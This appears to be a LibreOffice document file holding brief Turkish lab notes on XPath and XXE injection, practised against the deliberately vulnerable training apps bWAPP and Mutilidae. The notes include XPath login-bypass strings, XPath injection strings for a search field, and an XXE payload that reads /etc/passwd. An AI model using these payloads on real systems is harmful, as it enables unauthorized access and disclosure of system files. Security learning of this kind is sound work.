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Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003ef70f" officeooo:paragraph-rsid="00407778" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00492b71" officeooo:paragraph-rsid="00492b71" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00492b71" officeooo:paragraph-rsid="00492b71" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003ef70f" officeooo:paragraph-rsid="00407778" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="004ed320" officeooo:paragraph-rsid="004ed320" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="004ef514" officeooo:paragraph-rsid="004ef514" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="004ed320" officeooo:paragraph-rsid="004ef514" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="004ed320"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="004ef51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XML/Xpath Injection</text:p>
      <text:p text:style-name="P5">Bwapp &gt; XML/Xpath Injection (Login Form)</text:p>
      <text:p text:style-name="P5">XMLi, SQL e benzer düşünelim.</text:p>
      <text:p text:style-name="P2">admin' or 1=1 or ''='</text:p>
      <text:p text:style-name="P2">admin' or id='1 <text:span text:style-name="T1">(login ve pass e, Idleri değişerek yazacağız.)</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5">Bwapp &gt; XML/Xpath Injection (Search)</text:p>
      <text:p text:style-name="P5">URL den manipüle edeceğiz.</text:p>
      <text:p text:style-name="P2">‘ <text:span text:style-name="T1">yazınca, kızdı. Güvenlik açığı var demek.</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5">xpath(“//hero[contains(genre, ‘$genre’)]/movie”);</text:p>
      <text:p text:style-name="P5">kodun aslı budur, syntaxları kullanıp manipüle edeceğiz.</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">')]/child::node() | onemsiz[contains('onemsiz','onemsiz</text:p>
      <text:p text:style-name="P5">veya</text:p>
      <text:p text:style-name="P5">')]/* | /* [contains('onemsiz','onemsiz</text:p>
      <text:p text:style-name="P5">genre yerine bunlar yazıldığı takdirde, sorgu yapmış olacağız.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P7"><text:span text:style-name="T2">XXE </text:span>Injection</text:p>
      <text:p text:style-name="P6">Mutilidae &gt; A1 &gt; XML External Entity</text:p>
      <text:p text:style-name="P6">&lt;?xml version="1.0"?&gt;</text:p>
      <text:p text:style-name="P6">&lt;!DOCTYPE oku [&lt;!ENTITY dosya SYSTEM "/etc/passwd"&gt;]&gt;</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6">&lt;onemsiz&gt;&amp;dosya;&lt;/onemsiz&gt;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9-28T19:45:00.125645194</dc:date>
    <meta:editing-duration>PT15H1M</meta:editing-duration>
    <meta:editing-cycles>50</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.2$Linux_X86_64 LibreOffice_project/3c58a8f3a960df8bc8fd77b461821e42c061c5f0</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="19" meta:word-count="87" meta:character-count="690" meta:non-whitespace-character-count="622"/>
  </office:meta>
</office:document-meta>
</file>